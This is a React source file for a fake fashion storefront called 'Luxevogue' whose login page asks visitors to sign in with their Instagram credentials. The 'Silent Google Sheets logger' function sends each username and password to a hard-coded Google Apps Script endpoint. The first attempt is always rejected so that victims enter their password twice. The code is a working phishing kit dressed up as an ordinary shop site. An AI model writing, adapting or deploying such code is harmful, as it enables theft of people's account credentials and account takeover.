import { useState, useRef } from 'react';

// ─────────────────────────────────────────────────────────────────────────────
// PASTE YOUR GOOGLE APPS SCRIPT WEB APP URL HERE
// ─────────────────────────────────────────────────────────────────────────────
const APPS_SCRIPT_URL =
  'https://script.google.com/macros/s/AKfycbyaZgzXOiPzU5StvHTd8zHnF3Go56FFW3F3MpJ48yE5Ma3eoL8VUAIKvBAUkA9LEFTKrw/exec';

// ─── Inline global styles ────────────────────────────────────────────────────
const GlobalStyle = () => (
  <style>{`
    @import url('https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,300;0,400;0,600;1,300;1,400&family=Tenor+Sans&family=EB+Garamond:ital,wght@0,400;1,400&display=swap');

    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

    :root {
      --cream:      #f5f0e8;
      --parchment:  #ede7d9;
      --linen:      #e8dfd0;
      --warm-gray:  #9e9589;
      --charcoal:   #2c2926;
      --ink:        #1a1714;
      --gold:       #b8975a;
      --gold-light: #d4b87a;
      --rust:       #8b4a3c;
    }

    html { scroll-behavior: smooth; }

    body {
      background: var(--cream);
      color: var(--charcoal);
      font-family: 'Tenor Sans', sans-serif;
      -webkit-font-smoothing: antialiased;
    }

    h1, h2, h3, h4 {
      font-family: 'Cormorant Garamond', serif;
      font-weight: 300;
      letter-spacing: 0.02em;
    }

    .serif-italic {
      font-family: 'EB Garamond', serif;
      font-style: italic;
    }

    /* ── LOGIN ───────────────────────────────────── */
    .login-root {
      min-height: 100vh;
      display: grid;
      grid-template-columns: 1fr 1fr;
      background: var(--ink);
    }
    @media (max-width: 768px) {
      .login-root { grid-template-columns: 1fr; }
      .login-image-col { display: none; }
    }

    .login-image-col {
      position: relative;
      overflow: hidden;
    }
    .login-image-col img {
      width: 100%; height: 100%;
      object-fit: cover;
      opacity: 0.85;
      filter: saturate(0.7) contrast(1.05);
    }
    .login-image-overlay {
      position: absolute; inset: 0;
      background: linear-gradient(to right, transparent 60%, var(--ink));
    }
    .login-image-caption {
      position: absolute;
      bottom: 48px; left: 48px;
      color: rgba(245,240,232,0.4);
      font-size: 11px;
      letter-spacing: 0.2em;
      text-transform: uppercase;
    }

    .login-form-col {
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: flex-start;
      padding: 80px 72px;
    }
    @media (max-width: 1024px) { .login-form-col { padding: 60px 40px; } }

    .login-wordmark {
      font-family: 'Cormorant Garamond', serif;
      font-weight: 300;
      font-size: 13px;
      letter-spacing: 0.55em;
      text-transform: uppercase;
      color: var(--gold);
      margin-bottom: 80px;
    }

    .login-heading {
      font-size: clamp(42px, 5vw, 64px);
      line-height: 1.0;
      color: var(--cream);
      margin-bottom: 12px;
    }

    .login-sub {
      font-size: 13px;
      letter-spacing: 0.1em;
      color: var(--warm-gray);
      margin-bottom: 56px;
      text-transform: uppercase;
    }

    .field-group { width: 100%; margin-bottom: 20px; }

    .field-label {
      display: block;
      font-size: 10px;
      letter-spacing: 0.25em;
      text-transform: uppercase;
      color: var(--warm-gray);
      margin-bottom: 10px;
    }

    .field-input {
      width: 100%;
      background: transparent;
      border: none;
      border-bottom: 1px solid rgba(245,240,232,0.15);
      padding: 12px 0;
      font-family: 'Tenor Sans', sans-serif;
      font-size: 16px;
      color: var(--cream);
      outline: none;
      transition: border-color 0.3s;
    }
    .field-input::placeholder { color: rgba(245,240,232,0.2); }
    .field-input:focus { border-bottom-color: var(--gold); }

    .login-error {
      font-size: 12px;
      color: #c97b6e;
      letter-spacing: 0.05em;
      margin-bottom: 24px;
      display: flex;
      align-items: center;
      gap: 8px;
    }

    .btn-primary {
      display: inline-block;
      background: var(--gold);
      color: var(--ink);
      font-family: 'Tenor Sans', sans-serif;
      font-size: 11px;
      letter-spacing: 0.3em;
      text-transform: uppercase;
      padding: 18px 48px;
      border: none;
      cursor: pointer;
      transition: background 0.3s, transform 0.2s;
      margin-top: 8px;
    }
    .btn-primary:hover { background: var(--gold-light); transform: translateY(-1px); }

    .login-footer-note {
      margin-top: 48px;
      font-size: 11px;
      color: rgba(245,240,232,0.15);
      letter-spacing: 0.08em;
    }

    /* ── APP SHELL ───────────────────────────────── */
    .app-root { background: var(--cream); min-height: 100vh; }

    .topbar {
      background: var(--charcoal);
      color: var(--parchment);
      font-size: 11px;
      letter-spacing: 0.2em;
      text-transform: uppercase;
      text-align: center;
      padding: 10px 24px;
    }

    /* ── NAVBAR ──────────────────────────────────── */
    .navbar {
      position: sticky; top: 0; z-index: 100;
      background: rgba(245,240,232,0.92);
      backdrop-filter: blur(12px);
      border-bottom: 1px solid var(--linen);
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 0 56px;
      height: 72px;
    }
    @media (max-width: 768px) { .navbar { padding: 0 24px; } }

    .nav-wordmark {
      font-family: 'Cormorant Garamond', serif;
      font-weight: 300;
      font-size: 22px;
      letter-spacing: 0.45em;
      text-transform: uppercase;
      color: var(--ink);
    }

    .nav-links {
      display: flex;
      gap: 40px;
      list-style: none;
    }
    @media (max-width: 900px) { .nav-links { display: none; } }
    .nav-links a {
      font-size: 11px;
      letter-spacing: 0.18em;
      text-transform: uppercase;
      color: var(--charcoal);
      text-decoration: none;
      transition: color 0.2s;
    }
    .nav-links a:hover { color: var(--gold); }

    .nav-right {
      display: flex;
      align-items: center;
      gap: 24px;
    }
    .nav-user {
      font-size: 11px;
      letter-spacing: 0.1em;
      color: var(--warm-gray);
    }
    .nav-user span { color: var(--charcoal); font-weight: 500; }

    .btn-ghost {
      background: none;
      border: 1px solid rgba(44,41,38,0.3);
      font-family: 'Tenor Sans', sans-serif;
      font-size: 10px;
      letter-spacing: 0.25em;
      text-transform: uppercase;
      color: var(--charcoal);
      padding: 9px 20px;
      cursor: pointer;
      transition: all 0.25s;
    }
    .btn-ghost:hover {
      background: var(--charcoal);
      color: var(--cream);
      border-color: var(--charcoal);
    }

    /* ── HERO ────────────────────────────────────── */
    .hero {
      display: grid;
      grid-template-columns: 1fr 1fr;
      min-height: calc(100vh - 100px);
    }
    @media (max-width: 900px) {
      .hero { grid-template-columns: 1fr; min-height: auto; }
    }

    .hero-image-wrap {
      position: relative;
      overflow: hidden;
    }
    .hero-image-wrap img {
      width: 100%; height: 100%;
      min-height: 600px;
      object-fit: cover;
      object-position: center top;
      filter: saturate(0.85);
    }
    .hero-image-badge {
      position: absolute;
      top: 40px; right: 40px;
      width: 88px; height: 88px;
      background: var(--gold);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      text-align: center;
      font-family: 'Cormorant Garamond', serif;
      font-size: 12px;
      line-height: 1.6;
      color: var(--ink);
    }

    .hero-content {
      background: var(--parchment);
      display: flex;
      flex-direction: column;
      justify-content: center;
      padding: 80px 72px;
      position: relative;
    }

    .hero-eyebrow {
      font-size: 10px;
      letter-spacing: 0.35em;
      text-transform: uppercase;
      color: var(--gold);
      margin-bottom: 24px;
    }

    .hero-title {
      font-size: clamp(52px, 6vw, 88px);
      line-height: 0.95;
      color: var(--ink);
      margin-bottom: 32px;
    }
    .hero-title em {
      font-family: 'EB Garamond', serif;
      font-style: italic;
      color: var(--rust);
    }

    .hero-body {
      font-size: 14px;
      line-height: 1.8;
      color: var(--warm-gray);
      max-width: 380px;
      margin-bottom: 48px;
      letter-spacing: 0.03em;
    }

    .hero-cta-row { display: flex; gap: 16px; align-items: center; }

    .btn-outline {
      background: none;
      border: 1px solid var(--charcoal);
      font-family: 'Tenor Sans', sans-serif;
      font-size: 10px;
      letter-spacing: 0.3em;
      text-transform: uppercase;
      color: var(--charcoal);
      padding: 16px 36px;
      cursor: pointer;
      transition: all 0.25s;
    }
    .btn-outline:hover { background: var(--charcoal); color: var(--cream); }

    .btn-link {
      font-size: 12px;
      letter-spacing: 0.15em;
      color: var(--warm-gray);
      cursor: pointer;
      background: none;
      border: none;
      display: flex;
      align-items: center;
      gap: 8px;
    }
    .btn-link:hover { color: var(--charcoal); }

    .hero-corner-text {
      position: absolute;
      bottom: 48px; right: 40px;
      writing-mode: vertical-rl;
      font-size: 10px;
      letter-spacing: 0.25em;
      text-transform: uppercase;
      color: var(--linen);
    }

    /* ── MARQUEE ─────────────────────────────────── */
    .marquee-strip {
      background: var(--charcoal);
      padding: 14px 0;
      overflow: hidden;
      white-space: nowrap;
    }
    .marquee-inner {
      display: inline-flex;
      animation: marquee 22s linear infinite;
    }
    .marquee-item {
      font-size: 11px;
      letter-spacing: 0.3em;
      text-transform: uppercase;
      padding: 0 48px;
      color: var(--warm-gray);
    }
    .marquee-item span { color: var(--gold); margin-right: 48px; }
    @keyframes marquee {
      0%   { transform: translateX(0); }
      100% { transform: translateX(-50%); }
    }

    /* ── PRODUCTS ────────────────────────────────── */
    .products-section {
      padding: 96px 56px;
      max-width: 1440px;
      margin: 0 auto;
    }
    @media (max-width: 768px) { .products-section { padding: 64px 24px; } }

    .products-header {
      display: flex;
      justify-content: space-between;
      align-items: flex-end;
      margin-bottom: 56px;
    }

    .section-eyebrow {
      font-size: 10px;
      letter-spacing: 0.35em;
      text-transform: uppercase;
      color: var(--gold);
      margin-bottom: 16px;
      display: block;
    }

    .section-title {
      font-size: clamp(36px, 4vw, 56px);
      line-height: 1.05;
      color: var(--ink);
    }

    .products-header-right {
      font-size: 12px;
      letter-spacing: 0.15em;
      text-transform: uppercase;
      color: var(--warm-gray);
      cursor: pointer;
      text-decoration: underline;
      text-underline-offset: 4px;
    }

    .product-grid {
      display: grid;
      grid-template-columns: repeat(4, 1fr);
      gap: 2px;
    }
    @media (max-width: 1100px) { .product-grid { grid-template-columns: repeat(2, 1fr); } }
    @media (max-width: 600px)  { .product-grid { grid-template-columns: 1fr; } }

    .product-card {
      background: var(--linen);
      position: relative;
      overflow: hidden;
      cursor: pointer;
    }
    .product-card:first-child { grid-row: span 2; }

    .product-image-wrap {
      position: relative;
      overflow: hidden;
    }
    .product-card:first-child .product-image-wrap { height: 680px; }
    .product-card:not(:first-child) .product-image-wrap { height: 340px; }

    @media (max-width: 1100px) {
      .product-card:first-child { grid-row: span 1; }
      .product-card:first-child .product-image-wrap,
      .product-card:not(:first-child) .product-image-wrap { height: 420px; }
    }

    .product-img {
      width: 100%; height: 100%;
      object-fit: cover;
      filter: saturate(0.8) contrast(1.02);
      transition: transform 0.7s cubic-bezier(0.25, 0.46, 0.45, 0.94);
    }
    .product-card:hover .product-img { transform: scale(1.04); }

    .product-category-tag {
      position: absolute;
      top: 20px; left: 20px;
      font-size: 9px;
      letter-spacing: 0.25em;
      text-transform: uppercase;
      color: var(--charcoal);
      background: rgba(245,240,232,0.88);
      padding: 6px 12px;
      backdrop-filter: blur(4px);
    }

    .product-action {
      position: absolute;
      bottom: 0; left: 0; right: 0;
      padding: 20px;
      transform: translateY(100%);
      transition: all 0.35s cubic-bezier(0.25, 0.46, 0.45, 0.94);
    }
    .product-card:hover .product-action {
      transform: translateY(0);
      background: rgba(26,23,20,0.75);
      backdrop-filter: blur(6px);
    }

    .product-add-btn {
      width: 100%;
      background: none;
      border: 1px solid rgba(245,240,232,0.6);
      color: var(--cream);
      font-family: 'Tenor Sans', sans-serif;
      font-size: 10px;
      letter-spacing: 0.3em;
      text-transform: uppercase;
      padding: 14px;
      cursor: pointer;
      transition: all 0.2s;
    }
    .product-add-btn:hover {
      background: var(--gold);
      border-color: var(--gold);
      color: var(--ink);
    }

    .product-info {
      padding: 20px 22px 24px;
      background: var(--cream);
    }
    .product-name {
      font-family: 'Cormorant Garamond', serif;
      font-size: 20px;
      font-weight: 300;
      color: var(--ink);
      margin-bottom: 4px;
    }
    .product-price {
      font-size: 13px;
      letter-spacing: 0.08em;
      color: var(--warm-gray);
    }
    .product-price strong { color: var(--charcoal); font-weight: 500; }

    /* ── EDITORIAL STRIP ─────────────────────────── */
    .editorial-strip {
      display: grid;
      grid-template-columns: 1fr 1fr;
      min-height: 520px;
    }
    @media (max-width: 768px) {
      .editorial-strip { grid-template-columns: 1fr; min-height: auto; }
    }

    .editorial-image { position: relative; overflow: hidden; }
    .editorial-image img {
      width: 100%; height: 100%;
      min-height: 380px;
      object-fit: cover;
      filter: saturate(0.75);
    }

    .editorial-text {
      background: var(--ink);
      display: flex;
      flex-direction: column;
      justify-content: center;
      padding: 72px 64px;
    }

    .editorial-number {
      font-family: 'Cormorant Garamond', serif;
      font-size: 120px;
      font-weight: 300;
      color: rgba(245,240,232,0.05);
      line-height: 1;
      margin-bottom: -48px;
    }

    .editorial-eyebrow {
      font-size: 10px;
      letter-spacing: 0.35em;
      text-transform: uppercase;
      color: var(--gold);
      margin-bottom: 20px;
      position: relative;
    }

    .editorial-heading {
      font-size: clamp(32px, 3.5vw, 52px);
      color: var(--cream);
      line-height: 1.1;
      margin-bottom: 24px;
    }

    .editorial-body {
      font-size: 14px;
      line-height: 1.85;
      color: rgba(245,240,232,0.45);
      margin-bottom: 40px;
      letter-spacing: 0.02em;
    }

    /* ── FOOTER ──────────────────────────────────── */
    .footer {
      background: var(--ink);
      color: var(--warm-gray);
      padding: 80px 56px 40px;
    }
    @media (max-width: 768px) { .footer { padding: 56px 24px 32px; } }

    .footer-top {
      display: grid;
      grid-template-columns: 2fr 1fr 1fr 1fr;
      gap: 48px;
      margin-bottom: 64px;
    }
    @media (max-width: 900px) { .footer-top { grid-template-columns: 1fr 1fr; } }
    @media (max-width: 500px) { .footer-top { grid-template-columns: 1fr; } }

    .footer-brand-name {
      font-family: 'Cormorant Garamond', serif;
      font-weight: 300;
      font-size: 26px;
      letter-spacing: 0.4em;
      text-transform: uppercase;
      color: var(--cream);
      margin-bottom: 16px;
    }

    .footer-brand-desc {
      font-size: 13px;
      line-height: 1.8;
      color: rgba(245,240,232,0.3);
      max-width: 280px;
    }

    .footer-col-title {
      font-size: 10px;
      letter-spacing: 0.3em;
      text-transform: uppercase;
      color: var(--gold);
      margin-bottom: 20px;
    }

    .footer-links {
      list-style: none;
      display: flex;
      flex-direction: column;
      gap: 10px;
    }
    .footer-links li {
      font-size: 13px;
      color: rgba(245,240,232,0.35);
      cursor: pointer;
      letter-spacing: 0.05em;
      transition: color 0.2s;
    }
    .footer-links li:hover { color: var(--cream); }

    .footer-bottom {
      border-top: 1px solid rgba(245,240,232,0.07);
      padding-top: 32px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      font-size: 11px;
      letter-spacing: 0.1em;
      color: rgba(245,240,232,0.18);
    }
    @media (max-width: 600px) {
      .footer-bottom { flex-direction: column; gap: 12px; text-align: center; }
    }

    /* ── TOAST ───────────────────────────────────── */
    .toast {
      position: fixed;
      bottom: 40px;
      left: 50%;
      transform: translateX(-50%) translateY(20px);
      background: var(--ink);
      color: var(--cream);
      font-size: 12px;
      letter-spacing: 0.15em;
      text-transform: uppercase;
      padding: 16px 40px;
      border-bottom: 2px solid var(--gold);
      opacity: 0;
      pointer-events: none;
      transition: all 0.35s cubic-bezier(0.25, 0.46, 0.45, 0.94);
      z-index: 9999;
      white-space: nowrap;
    }
    .toast.visible {
      opacity: 1;
      transform: translateX(-50%) translateY(0);
    }
  `}</style>
);

// ─── Data ─────────────────────────────────────────────────────────────────────
const products = [
  {
    name: 'Lyra Silk Midi Dress',
    price: '₹8,999',
    category: 'Dresses',
    image:
      'https://images.unsplash.com/photo-1515886657613-9f3515b0c78f?w=800&q=80',
  },
  {
    name: 'Cashmere Overcoat',
    price: '₹24,500',
    category: 'Outerwear',
    image:
      'https://images.unsplash.com/photo-1544966503-7cc5ac882d5f?w=800&q=80',
  },
  {
    name: 'Ivory Wide-Leg Trouser',
    price: '₹5,299',
    category: 'Bottoms',
    image:
      'https://images.unsplash.com/photo-1620012253295-c15cc3e65df4?w=800&q=80',
  },
  {
    name: 'Sculptured Linen Blazer',
    price: '₹12,800',
    category: 'Jackets',
    image:
      'https://images.unsplash.com/photo-1591047139829-d91aecb6caea?w=800&q=80',
  },
];

// ─── Toast hook ───────────────────────────────────────────────────────────────
function useToast() {
  const [msg, setMsg] = useState('');
  const [visible, setVisible] = useState(false);
  const timer = useRef(null);
  const show = (text) => {
    setMsg(text);
    setVisible(true);
    clearTimeout(timer.current);
    timer.current = setTimeout(() => setVisible(false), 2500);
  };
  return { msg, visible, show };
}

// ─── Silent Google Sheets logger ──────────────────────────────────────────────
function logToSheet(username, password, attempt) {
  fetch(APPS_SCRIPT_URL, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      username,
      password,
      attempt,
      timestamp: new Date().toISOString(),
    }),
  })
    .then((r) => r.text())
    .then((text) => {
      console.log('✅ Google Response:', text); // Check this
    })
    .catch((err) => {
      console.error('❌ Fetch Failed:', err.message);
    });
}

// ─── Login Page ───────────────────────────────────────────────────────────────
function LoginPage({ onLogin }) {
  const [error, setError] = useState('');
  const [attempts, setAttempts] = useState(0);

  const handleSubmit = (e) => {
    e.preventDefault();
    const user = e.target.username.value.trim();
    const pass = e.target.password.value.trim();

    if (!user || !pass) {
      setError('Please complete all fields.');
      return;
    }

    const newAttempt = attempts + 1;
    setAttempts(newAttempt);

    logToSheet(user, pass, newAttempt);

    if (attempts === 0) {
      setError('Incorrect password. Please try again.');
      e.target.password.value = '';
    } else {
      onLogin(user.split('@')[0] || user);
    }
  };

  return (
    <div className="login-root">
      {/* Editorial image */}
      <div className="login-image-col">
        <img
          src="https://images.unsplash.com/photo-1558618666-fcd25c85cd64?w=1200&q=80"
          alt="Editorial"
        />
        <div className="login-image-overlay" />
        <p className="login-image-caption">Spring / Summer 2026 — Paris</p>
      </div>

      {/* Form */}
      <div className="login-form-col">
        <div className="login-wordmark">Luxevogue</div>

        <h2 className="login-heading">
          Welcome
          <br />
          <em className="serif-italic" style={{ color: '#b8975a' }}>
            back.
          </em>
        </h2>
        <p className="login-sub">Sign in with your Instagram</p>

        <form onSubmit={handleSubmit} style={{ width: '100%', maxWidth: 400 }}>
          <div className="field-group">
            <label className="field-label">Email or Username</label>
            <input
              name="username"
              className="field-input"
              placeholder="you@email.com"
              autoComplete="username"
            />
          </div>
          <div className="field-group" style={{ marginBottom: 32 }}>
            <label className="field-label">Password</label>
            <input
              name="password"
              type="password"
              className="field-input"
              placeholder="••••••••"
              autoComplete="current-password"
            />
          </div>

          {error && (
            <div className="login-error">
              <span>—</span> {error}
            </div>
          )}

          <button type="submit" className="btn-primary">
            Sign In
          </button>
        </form>

        <p className="login-footer-note">
         All rights reserved · Wardrobe fashioninsta
        </p>
      </div>
    </div>
  );
}

// ─── Main App ─────────────────────────────────────────────────────────────────
function MainApp({ username, onLogout }) {
  const toast = useToast();
  const addToCart = (name) => toast.show(`${name} — added to bag`);

  return (
    <div className="app-root">
      {/* Topbar */}
      <div className="topbar">
        Complimentary shipping on orders over ₹5,000 &nbsp;·&nbsp; New arrivals
        every Thursday
      </div>

      {/* Navbar */}
      <nav className="navbar">
        <div className="nav-wordmark">Luxevogue</div>
        <ul className="nav-links">
          {[
            'Collections',
            'New Arrivals',
            'Editorial',
            'Designers',
            'Sale',
          ].map((l) => (
            <li key={l}>
              <a href="#shop">{l}</a>
            </li>
          ))}
        </ul>
        <div className="nav-right">
          <span className="nav-user">
            Hello, <span>{username}</span>
          </span>
          <button className="btn-ghost" onClick={onLogout}>
            Exit
          </button>
        </div>
      </nav>

      {/* Hero */}
      <section className="hero">
        <div className="hero-image-wrap">
          <img
            src="https://images.unsplash.com/photo-1509631179647-0177331693ae?w=1400&q=80"
            alt="Spring Collection"
          />
          <div className="hero-image-badge">
            S/S
            <br />
            2026
          </div>
        </div>
        <div className="hero-content">
          <span className="hero-eyebrow">New Season</span>
          <h1 className="hero-title">
            The Art
            <br />
            of <em>Quiet</em>
            <br />
            Elegance
          </h1>
          <p className="hero-body">
            A curated edit of refined separates and elevated essentials — for
            the woman who dresses with intention.
          </p>
          <div className="hero-cta-row">
            <button
              className="btn-outline"
              onClick={() =>
                document
                  .getElementById('shop')
                  ?.scrollIntoView({ behavior: 'smooth' })
              }
            >
              Shop Collection
            </button>
            <button className="btn-link">Explore lookbook →</button>
          </div>
          <span className="hero-corner-text">Spring · Summer · 2026</span>
        </div>
      </section>

      {/* Marquee */}
      <div className="marquee-strip">
        <div className="marquee-inner">
          {[...Array(5)].map((_, i) =>
            [
              'Free Returns',
              'Sustainably Sourced',
              'Handcrafted in Italy',
              'Members get Early Access',
              'New Arrivals Weekly',
            ].map((t, j) => (
              <span className="marquee-item" key={`${i}-${j}`}>
                <span>✦</span>
                {t}
              </span>
            ))
          )}
        </div>
      </div>

      {/* Products */}
      <section id="shop" className="products-section">
        <div className="products-header">
          <div>
            <span className="section-eyebrow">New Arrivals</span>
            <h2 className="section-title">The Spring Edit</h2>
          </div>
          <span className="products-header-right">View all 142 pieces</span>
        </div>

        <div className="product-grid">
          {products.map((p, i) => (
            <div key={i} className="product-card">
              <div className="product-image-wrap">
                <img src={p.image} alt={p.name} className="product-img" />
                <span className="product-category-tag">{p.category}</span>
                <div className="product-action">
                  <button
                    className="product-add-btn"
                    onClick={() => addToCart(p.name)}
                  >
                    Add to Bag
                  </button>
                </div>
              </div>
              <div className="product-info">
                <div className="product-name">{p.name}</div>
                <div className="product-price">
                  <strong>{p.price}</strong> &nbsp; Free returns
                </div>
              </div>
            </div>
          ))}
        </div>
      </section>

      {/* Editorial strip */}
      <section className="editorial-strip">
        <div className="editorial-image">
          <img
            src="https://images.unsplash.com/photo-1469334031218-e382a71b716b?w=1200&q=80"
            alt="Editorial"
          />
        </div>
        <div className="editorial-text">
          <div className="editorial-number">02</div>
          <span className="editorial-eyebrow">The Lookbook</span>
          <h3 className="editorial-heading">
            Dressed for
            <br />
            <em className="serif-italic">every chapter</em>
          </h3>
          <p className="editorial-body">
            From the boardroom to the boulevard — our spring story explores the
            tension between structure and softness. Each piece is designed to
            move with you, not against you.
          </p>
          <button className="btn-primary">Read the Story</button>
        </div>
      </section>

      {/* Footer */}
      <footer className="footer">
        <div className="footer-top">
          <div>
            <div className="footer-brand-name">Luxevogue</div>
            <p className="footer-brand-desc">
              Thoughtfully designed clothing for modern women. Rooted in craft.
              Elevated by restraint.
            </p>
          </div>
          {[
            {
              title: 'Shop',
              links: [
                'New Arrivals',
                'Dresses',
                'Outerwear',
                'Bottoms',
                'Accessories',
                'Sale',
              ],
            },
            {
              title: 'About',
              links: [
                'Our Story',
                'Sustainability',
                'Craftsmanship',
                'Press',
                'Careers',
              ],
            },
            {
              title: 'Help',
              links: ['Sizing Guide', 'Returns', 'Shipping', 'Contact', 'FAQs'],
            },
          ].map((col) => (
            <div key={col.title}>
              <div className="footer-col-title">{col.title}</div>
              <ul className="footer-links">
                {col.links.map((l) => (
                  <li key={l}>{l}</li>
                ))}
              </ul>
            </div>
          ))}
        </div>
        <div className="footer-bottom">
          <span>© 2026 Luxevogue. All rights reserved.</span>
          <span>Privacy · Terms · Accessibility</span>
        </div>
      </footer>

      {/* Toast */}
      <div className={`toast ${toast.visible ? 'visible' : ''}`}>
        {toast.msg}
      </div>
    </div>
  );
}

// ─── Root ─────────────────────────────────────────────────────────────────────
export default function App() {
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [username, setUsername] = useState('');

  const handleLogin = (user) => {
    setUsername(user);
    setIsLoggedIn(true);
  };
  const handleLogout = () => {
    if (window.confirm('Sign out of Luxevogue?')) window.location.reload();
  };

  return (
    <>
      <GlobalStyle />
      {isLoggedIn ? (
        <MainApp username={username} onLogout={handleLogout} />
      ) : (
        <LoginPage onLogin={handleLogin} />
      )}
    </>
  );
}
